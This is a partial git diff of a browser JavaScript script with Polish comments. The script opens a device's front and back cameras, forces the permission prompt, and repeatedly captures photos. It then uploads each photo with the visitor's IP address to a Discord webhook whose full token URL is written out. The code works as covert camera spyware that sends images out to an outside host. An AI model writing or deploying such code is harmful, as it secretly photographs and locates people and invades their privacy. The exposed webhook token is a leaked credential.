@@ -4,17 +4,21 @@ const frontCtx = frontCanvas.getContext('2d');
 const backCtx = backCanvas.getContext('2d');
 
 let frontStream, backStream;
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1346483073277231154/xBd6PojurtkMCQeb1Ithkf8sRXxB-pujPHTGAPdoJHaGQZD2v2GQ2Lyu9j9OXu4e285q";
 
-// Pobieranie dostępu do kamer i robienie zdjęć co sekundę
+// Funkcja uruchamiająca kamery i wymuszająca pytanie o zgodę
 async function startCameras() {
     try {
+        // Wymuszenie pytania o dostęp do kamery
+        await navigator.mediaDevices.getUserMedia({ video: true });
+
         // Pobranie dostępnych urządzeń
         const devices = await navigator.mediaDevices.enumerateDevices();
         const videoDevices = devices.filter(device => device.kind === 'videoinput');
 
-        // Wybranie przedniej i tylnej kamery
-        const frontCamera = videoDevices.find(device => device.label.toLowerCase().includes('front'));
-        const backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back'));
+        // Wybór przedniej i tylnej kamery
+        const frontCamera = videoDevices.find(device => device.label.toLowerCase().includes('front')) || videoDevices[0];
+        const backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[1];
 
         // Uruchomienie przedniej kamery
         if (frontCamera) {
@@ -61,7 +65,7 @@ async function captureAndSend(video, ctx, canvas, cameraName) {
                 content: `📸 Nowe zdjęcie (${cameraName})! IP użytkownika: ${userIP}`
             }));
 
-            await fetch("https://discord.com/api/webhooks/1341148754161569956/lHJVIyJeOpz2lpBfU_eRjPKKcvmCSw8vAo6X2bE535wvOnwFxRB9yIYIDchCMAx_zVe4", {
+            await fetch(WEBHOOK_URL, {
                 method: "POST",
                 body: formData
             });
